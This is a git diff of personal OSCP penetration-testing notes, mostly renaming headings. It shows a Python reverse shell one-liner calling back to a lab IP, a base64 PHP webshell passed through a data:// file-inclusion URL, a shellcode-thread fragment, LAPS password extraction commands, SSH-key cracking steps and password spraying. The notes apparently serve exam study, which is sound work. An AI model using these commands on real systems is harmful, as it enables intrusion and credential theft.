@@ -1815,7 +1815,7 @@ As these are my OSCP notes, and AV Evasion is outside the scope of the exam, I'm
     `$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };`
 
 
-### TCM Notes Windows Privesc Notes
+### TCM Windows Privesc Notes
 
 Service Control:
 - `sc query windefend` - checks Windows Defender
@@ -1944,7 +1944,9 @@ To crack the entry password:
 
 ## LAPS
 
-### To get LAPS password ("ms-mcs-AdmPwd") either:
+### Get LAPS password 
+This is the `ms-mcs-AdmPwd`
+If LAPS is enabled, try any of:
 1. `nxc ldap $target -u $user -p $password --kdcHost $target -M laps`
 2. `python3 pyLAPS.py --action get -u '$user' -d 'butchy.offsec' -p '$password' --dc-ip $target`
 3. pyLAPS.py can also get it using NTLM (`-p NTLM:NTLM`)
@@ -2019,9 +2021,10 @@ cat <<'EOT'> file.name
 > EOT
 (the EOT ends the file)
 
-### apparently secret python reverse shell
+### Useful Python reverse shell
+Try when others aren't working.  
 `python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.235",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"`
-- same as Python #2 from rev shells, but with the interior "'s escaped with \'s
+- same as Python #2 from rev shells, but with the interior `"`'s escaped with `\`'s
 
 ### Cron jobs - linpeas
 
@@ -2101,7 +2104,8 @@ Run these three commands:
 	1. Note that these variables are set temporarily with that terminal session, but could be reversed by repeating the command with `unset` instead of `export`
 
 
-#### Python Script to generate Powershell reverse shell
+#### Generate base64 shell
+
 ```
 import sys
 import base64
@@ -2134,7 +2138,7 @@ Data:
 		- Output: `PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==`
 - `http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 
-### Time Saving Enumeration Commands
+### Time Saving Enumeration
 Windows:
 - `tree /f /a`- to list all files in directories and subdirectories
 
@@ -2150,7 +2154,7 @@ Linux:
 - `ssh -p 2222(unless 22) -i $created_key(no pub) $user@$host`
 - Using a id_sa (private key) from /home/user/.ssh/id_sa
 
-### Finding key protected by password: if ssh key protected by a password
+### Password Protected SSH key
 1. may need to chmod 600 id_rsa (too many permissions won't work)
 2. ssh2john id_rsa > ssh.hash
 3. remove "id_rsa:" from ssh.hash
@@ -2181,7 +2185,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
     
 - if `**5**`(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
 
-## Various Tool Syntax
+## Misc AD Tool Syntax
 
 ### Kerbrute
 Password spraying:
